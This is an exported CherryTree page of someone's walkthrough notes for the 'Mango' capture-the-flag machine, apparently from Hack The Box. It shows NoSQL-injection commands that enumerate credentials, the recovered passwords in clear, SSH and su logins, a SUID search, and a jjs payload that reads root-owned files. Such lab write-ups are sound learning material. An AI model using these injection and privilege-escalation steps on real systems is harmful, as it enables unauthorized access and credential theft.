<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.162 Mango</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.162 Mango</h1><br/>nmap showed that 80, 443, and 22 were open<br />version nmap showed that 443&#39;s ssl certificate was for staging-order.mango.htb<br />I added that and mango.htb to the hosts file<br /><br />##cheated to see that nosql was running (although I could have guessed)<br />This github project got me the usernams and passwords I needed.<br /><a href="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git">https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git</a><br /><br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login,submit:submit<br />python nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login,submit:submit<br /><br />usernames<br />admin<br />mango<br /><br />Passwords<br />t9KcS3&gt;!0B#2<br />h3mXK8RhU~f{]f5H<br /><br />Logging in to the webpage didn&#39;t work, but ssh did!<br />mango@mango.htb:h3mXK8RhU~f{]f5H<br /><br />su -l admin<br />t9KcS3&gt;!0B#2<br />user.txt!!<br /><br />find / -perm -4000 2&gt;/dev/null | xargs ls -lah <br />^Showed me that I could run /usr/lib/jvm/java-11-openjdk-amd64/bin/jss as root! and it was in gtfo bins!<br /><br />cd into /usr/lib/jvm/java-11-openjdk-amd64/bin/<br />run ./jss<br /><br />throw the gtfo magic in there<br />echo &#39;var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);<br />var FileReader = Java.type(&quot;java.io.FileReader&quot;);<br />var br = new BufferedReader(new FileReader(&quot;file_to_read&quot;));                &lt;replace file_to_read with /root/root.txt<br />while ((line = br.readLine()) != null) { print(line); }&#39; | jjs<br /><br />root.txt shits to screen!</div></body></html>